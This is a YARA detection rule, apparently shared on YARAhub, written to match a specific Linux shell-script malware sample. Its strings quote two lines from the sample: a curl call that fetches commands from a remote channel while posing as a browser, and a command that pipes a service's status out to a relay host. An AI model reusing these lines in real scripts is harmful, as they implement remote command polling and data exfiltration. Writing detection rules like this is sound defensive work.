rule LIN_Sample_Unique_4a292b49 {
    meta:
        description = "Specimen unique (soumission Bazaar) - strings distinctifs propres au sample"
        author      = "Marjoriefort"
        date        = "2026-09-17"
        reference   = "4a292b499ed7a56bda441a45bb9e8c95c884437d0a30b4e9df4484bd5bf90338.sh"
        confidence  = "low"
        note        = "Regle specimen : vise la re-soumission identique. Verifier en sandbox."
        yarahub_uuid              = "558410fb-4544-40ac-815a-175948a06d59"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "8c9684a90413db04fe432b4b5c3e2585"
        yarahub_reference_link    = "https://github.com/Marjoriefort/yara-rules"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
    strings:
        $a = "  CMD=$(curl -s -m 10 -H \"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\" \"$CHANNEL\" 2>/dev/null)" ascii wide
        $b = "systemctl is-active sysstat-collect 2>/dev/null | curl -s -m 8 --data-binary @- $R8/relay-status" ascii wide
    condition:
        all of them
}
